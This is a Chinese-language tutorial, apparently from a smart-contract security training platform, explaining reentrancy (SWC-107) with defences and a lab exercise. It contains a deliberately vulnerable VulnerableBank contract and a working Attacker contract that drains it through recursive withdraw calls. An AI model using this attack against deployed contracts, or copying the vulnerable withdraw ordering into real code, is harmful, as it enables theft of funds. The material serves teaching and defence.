# 重入攻击 (Reentrancy) 深度剖析

**SWC-107** · 难度 ⭐ · 平台案例 1

## 漏洞本质

合约 A 在持有以太坊状态变量的情况下调用外部合约 B；如果 B 在本次调用未完成前**回头调用 A 的某个函数**，A 看到的状态与原以为的不一致。

## VulnerableBank 示例

```solidity
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // ❌ 先转账 ── call 转发了大量 gas
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");

        // ❌ 才清零 ── 攻击者已在 fallback 里再次调用
        balances[msg.sender] = 0;
    }
}
```

## 攻击合约

```solidity
contract Attacker {
    VulnerableBank public target;
    constructor(address _t) { target = VulnerableBank(_t); }

    function attack() external payable {
        target.deposit{value: msg.value}();   // 1) 存 1 ETH
        target.withdraw();                    // 2) 触发提现
    }

    receive() external payable {              // 3) 收到 ETH → 再调一次
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
```

## 攻击时序

```
Attacker.attack()
  → Bank.deposit{1 ETH}()      balances[Attacker] = 1
  → Bank.withdraw()
       amount = 1
       Bank.send 1 ETH to Attacker
         → Attacker.receive()
              → Bank.withdraw()    // ⚠️ balances[Attacker] 还是 1
                   amount = 1
                   Bank.send 1 ETH to Attacker
                     → Attacker.receive()
                          → Bank.withdraw()
                               ... 循环直到 Bank 余额耗尽
                          → 没钱了, balances[Attacker]=0
       balances[Attacker] = 0    // ⚠️ 来得太晚了
```

每层递归都让 Bank 多支出 1 ETH，而 Attacker 的 balances 始终被外层函数视作 1。

## 多种变体

| 变体 | 描述 |
|---|---|
| **单函数重入** | 上面示例，直接调 withdraw |
| **跨函数重入** | A 调 B 时，B 调回 A 的**另一个**函数；该函数读到 A 还没更新的状态 |
| **跨合约重入** | A 经过 C 间接回到 A；常见于借贷协议跨多池调用 |
| **只读重入** | 攻击者只读取 A 的状态（未改），但读到的状态被外部依赖（如预言机）误用，间接造成损失 |

## 防御一：先改状态再外部调用

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "no balance");

    balances[msg.sender] = 0;                  // ✅ 先清零
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "send failed");
}
```

这就是 Checks-Effects-Interactions。

## 防御二：互斥锁

```solidity
bool private locked;
modifier nonReentrant() {
    require(!locked, "reentrant");
    locked = true;
    _;
    locked = false;
}

function withdraw() external nonReentrant {
    ...
}
```

OpenZeppelin 的 `ReentrancyGuard.sol` 提供了这个模式的标准实现。

## 防御三：transfer/send (有限)

```solidity
payable(msg.sender).transfer(amount);  // 转发 2300 gas
```

只发 2300 gas 让对方做不了重入。但 Istanbul 升级（EIP-1884）让某些操作 gas 涨了，transfer 可能不够用了。**推荐 Checks-Effects-Interactions + ReentrancyGuard 组合，不要依赖 transfer 的 2300 gas 假设**。

## 实战

在「漏洞实验」选择 **重入攻击 - 简单银行**，平台已经给好了 Attacker 模板，按"提交评测"就能看到 100/100 通过。然后切到 **修复 (fix)** 模式提交 `SafeBank.sol`，看修复合约能否挡住攻击。
